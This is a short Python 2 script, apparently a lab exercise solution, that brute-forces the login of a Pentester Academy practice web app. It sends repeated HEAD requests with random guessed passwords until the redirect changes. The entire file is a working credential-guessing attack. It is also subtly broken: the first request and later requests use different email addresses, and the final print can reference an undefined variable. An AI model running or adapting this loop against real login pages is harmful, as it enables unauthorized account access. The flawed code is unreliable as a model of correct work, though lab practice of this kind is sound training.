import httplib
import random

data = []

def id_generator(size=5, chars="mno"):
    return ''.join(random.choice(chars) for x in range(size))
def nextPass():
	password = id_generator()
	while password in data:
		print "%s in %s"%( password, data)
		password =id_generator()
	data.append(password)
	return password


conn = httplib.HTTPConnection('www.pentesteracademylab.appspot.com')
conn.request("HEAD", "/lab/webapp/auth/1/loginscript?email=admin%40pentesteracademy.com&password="+nextPass())
res = conn.getresponse()

while res.getheader("location")=="http://www.pentesteracademylab.appspot.com/lab/webapp/auth/1/login":
	conn.close()
	nextPw = nextPass()
	print "didn't work, trying %s"%(nextPw)
	conn.request("HEAD", "/lab/webapp/auth/1/loginscript?email=nick%40pentesteracademy.com&password="+nextPw)
	res = conn.getresponse()

print "weeee location = " + res.getheader('location') +", last used password: "+nextPw